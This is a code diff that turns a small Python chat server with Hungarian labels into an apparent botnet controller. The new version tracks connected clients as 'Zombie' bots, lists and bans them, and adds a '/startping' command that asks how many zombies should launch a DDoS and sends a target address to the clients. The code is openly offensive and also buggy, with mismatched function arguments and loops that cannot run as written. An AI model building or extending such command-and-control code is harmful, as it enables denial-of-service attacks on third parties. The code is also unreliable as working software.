@@ -1,62 +1,141 @@
+from pydoc import cli
 import socket
+import select
+from turtle import pencolor
+from colorama import Fore, Back, Style
+import os
 
+HOST = '192.168.1.3'
+PORT = 8000
+class connects:
+    IP = []
+    Port = []
+    counter = 0
+pingers = []
+who = ""
+class blacklist:
+    IP = []
+    counter = 0
 
-if __name__ == "__main__":
-    class szinek:
-        yellow = "\33[33m\33[1m"
-        blue = "\33[34m\33[1m"
-        white = "\33[0m"
-        green = "\33[32m"
-        red = "\33[31m\33[1m"
-    # For tcp
+ACK_TEXT = 'text_received'
+class szinek:
+    yellow = Fore.YELLOW
+    blue = Fore.LIGHTBLUE_EX
+    white = Fore.WHITE
+    green = Fore.LIGHTGREEN_EX
+    red = Fore.RED
+
+def main():    
+    os.system('cls||clear')
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.bind((HOST, PORT))
+    sock.listen(5)
+    print(szinek.green + '= '*10 +'Szerver Elindult'+ ' ='*10 + szinek.white)
+    # accept the socket response from the client, and get the connection object
+    conn, addr = sock.accept()     # Note: execution waits here until the client calls sock.connect()
+    message = "/join"
+    sendTextViaSocket(message, conn)
+    connects.counter +=1
+    connects.IP.append(addr[0])
+    connects.Port.append(addr[1])
+    print (szinek.green + "ÚJ kapcsolat:")
+    print(szinek.blue + "IP: " + szinek.yellow + addr[0]+"\n" +
+        szinek.blue + "Port: " + szinek.yellow + str(addr[1])+"\n")
 
-    IPs = [
-        
-    ]
-
-
-    host= "192.168.1.3"; port=8000
-
-
-    sock.bind((host,port))
-    # Number of backlog clients
-    sock.listen(100)
-
-    print (szinek.green + " \t\t\t\tSERVER WORKING \33[0m" )
-    print(szinek.yellow+"IP: "+ szinek.blue + host + szinek.white)
-    print(szinek.yellow+"Port: "+ szinek.blue + str(port) + szinek.white)
+    
 
     while True:
-        (client, (ip, port)) = sock.accept()
-        IPs.append(ip)
-        print (szinek.yellow + "Új kliens csatlakozva. " + szinek.green +  "IP: " + szinek.blue + "{}".format(ip) + szinek.green + " Port: " + szinek.blue + "{}".format(port) + szinek.white)
-        data = client.recv(2048)
-        while len(data):
-            message = data.decode()
-            if (message.startswith("/setusername")):
-                IPs.append("{}".format(ip,message))
-                #print(IPs[message] + " changed username to:" + message)
-                print(IPs)
+        message = input(szinek.blue + "\n> " + szinek.yellow)
+
+        if connects.IP in blacklist.IP:
+            message = "/ban BLACKLISTED"
+            sendTextViaSocket(message, conn)
+            print(szinek.red + "Bannolt IP próbált csatlakozni: " + szinek.yellow + addr)
+            sock.close()
+
+        if message == "/help":
+            print(szinek.blue + "Parancsok:")
+            print(szinek.yellow + " "*10 + "/startping [IP] [Target]")
+            print(szinek.yellow + " "*10 + "/bots")
+            print(szinek.yellow + " "*10 + "/pingek")
+            print(szinek.yellow + " "*10 + "/szin [Tesztelendő szín öszetétel]")
+
+        elif message == "/bots":
+            print("Csatlakozott Zombie: " + str(connects.counter))
+            for i in connects.IP:
+                print(i)
+
+        elif message == "/pingek":
+            for i in pingers:
+                print(i)
+
+        elif message.startswith("/ban"):
+            banned = message.replace("/ban ", "")
+            if banned == "list":
+                print("Bannolt IPk száma: " + str(blacklist.counter))
+                for i in blacklist.IP:
+                    print(i)
             else:
-                if (message == "/quit"):
-                    data = client.recv(2048)
-                    sock.close()
-                    print(szinek.red + "User: " + "{}".format(IPs) +" Diconnected." + szinek.white)
-                    break
-                elif(message == "/reconnect"):
-                    sock.close()
-                    (client, (ip, port)) = sock.accept()
-                elif(message == "/ping"):
-                    client.send("kurva".encode())
-                    data = client.recv(2048)
-                    continue
-                elif(not message.startswith("/")):
-                    print (szinek.yellow + "User: " + szinek.blue + "{}".format(IPs) + szinek.yellow + " Sent Message : " + szinek.green + message + szinek.white)
-                    client.send(data.upper())
-                    data = client.recv(2048)
+                for i in connects.IP:
+                    if banned in connects.IP:
+                        reason = input(szinek.blue + "Indok: " + szinek.red)
+                        banned_ip = connects.IP.index(banned)
+                        connects.IP.pop(banned_ip)
+                        connects.counter-=1
+                        blacklist.IP.append(banned)
+                        blacklist.counter += 1
+                        print(szinek.red + "Kibannoltad a következő IPt: " + szinek.yellow + banned)
+                        message = "/ban " + reason
+                        sendTextViaSocket(message, conn)
+                        sock.close()
+                        continue
+                    else:
+                        print(szinek.red + "Nem található csatlakozó erről az IPről!")
+        
+        elif message.startswith("/unban"):
+            unbanned = input("Unbannolni kívánt IP: " + szinek.blue)
+            if unbanned in blacklist.IP:
+                blacklist.IP.remove(unbanned)
+                blacklist.counter-=1
+                print(szinek.green + "Sikeresen unbannoltad a következő IPt: " + szinek.yellow + unbanned)
+            else:
+                print(szinek.red + "Nincs ilyen bannolt IP!")
 
+        elif message == "/startping":
+            how_many = int(input("Hány Zombie ddosoljon: "))
+            i = 0
+            while i < how_many:
+                who = input("IP: ")
+                i+=1
+            target = input("Target: ")
+            message = "/startping " + target
+            for i in pingers:
+                pingers.append(who + target)
+                print(i + " pingeli: " + target)
+                sendTextViaSocket(who, message, conn)
 
-    print ("Closing the Socket!!")
-    sock.close()
+        elif message.startswith("/szin"):
+            color_test_string = message.replace("/szin ", "")
+            print(szinek.yellow + color_test_string)
+            print(szinek.blue + color_test_string)
+            print(szinek.white + color_test_string)
+            print(szinek.green + color_test_string)
+            print(szinek.red + color_test_string + szinek.white)
+        
+        elif message.startswith("/whisper"):
+            whisp = message.replace("/whisper ", "")
+            message = whisp
+            sendTextViaSocket(message, conn)
+        
+        else:
+            print(szinek.red + "Hibás syntax vagy nincs ilyen parancs!")
+
+def sendTextViaSocket(message, sock):
+    # encode the text message
+    encodedMessage = bytes(message, 'utf-8')
+
+    # send the data via the socket to the server
+    sock.send(encodedMessage)
+
+if __name__ == '__main__':
+    main()
